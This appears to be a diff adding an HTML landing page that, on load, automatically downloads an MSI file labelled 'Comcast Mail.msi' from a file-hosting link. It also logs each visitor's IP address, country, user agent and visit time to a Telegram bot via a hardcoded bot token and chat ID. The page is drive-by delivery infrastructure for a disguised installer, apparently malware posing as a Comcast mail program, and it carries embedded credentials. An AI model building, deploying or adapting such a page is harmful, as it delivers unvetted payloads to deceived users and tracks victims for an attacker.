@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Preparing download…</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- ========= SETTINGS ========= -->
+<script>
+  const TARGET_URL = "https://store8.gofile.io/download/direct/6d2ea3c7-7061-4411-b99f-03b73b606333/Comcast%20Mail.msi";
+
+  const TG_BOT_TOKEN = "8511733843:AAGFDBKxUSRj6EmfCEVyGcEy2_WabTm2cQA";
+  const TG_CHAT_ID  = "8140730062";
+</script>
+<!-- ============================ -->
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, Helvetica, sans-serif;
+  background: #f5f5f5;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+}
+.box {
+  background: #fff;
+  padding: 24px;
+  border-radius: 8px;
+  text-align: center;
+  max-width: 360px;
+  width: 100%;
+  box-shadow: 0 4px 16px rgba(0,0,0,.08);
+}
+h1 { font-size: 18px; margin-bottom: 8px; }
+p  { font-size: 14px; color: #666; }
+a  {
+  display: inline-block;
+  margin-top: 16px;
+  color: #1a73e8;
+  text-decoration: none;
+  font-weight: 500;
+}
+</style>
+</head>
+
+<body>
+<div class="box">
+  <h1>Your download is starting…</h1>
+  <p>If it doesn’t start automatically, click below.</p>
+  <a id="manual" href="#">Download manually</a>
+</div>
+
+<script>
+/* Attach manual link */
+document.getElementById("manual").href = TARGET_URL;
+
+/* Telegram logging */
+async function logVisit() {
+  try {
+    const ip = await fetch("https://ipapi.co/json/")
+      .then(r => r.json())
+      .catch(() => ({}));
+
+    const message =
+`🔔 Download Visit
+
+🌍 Country: ${ip.country_name || "Unknown"}
+📍 IP: ${ip.ip || "Unknown"}
+🖥 UA: ${navigator.userAgent}
+⏰ Time: ${new Date().toLocaleString()}
+
+📦 File:
+${TARGET_URL}`;
+
+    const payload = JSON.stringify({
+      chat_id: TG_CHAT_ID,
+      text: message
+    });
+
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: payload
+    });
+
+  } catch (e) {}
+}
+
+/* Auto-download */
+function startDownload() {
+  const a = document.createElement("a");
+  a.href = TARGET_URL;
+  a.download = "";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+/* Run immediately on load */
+window.onload = () => {
+  logVisit();
+  setTimeout(startDownload, 150);
+};
+</script>
+
+</body>
+</html>
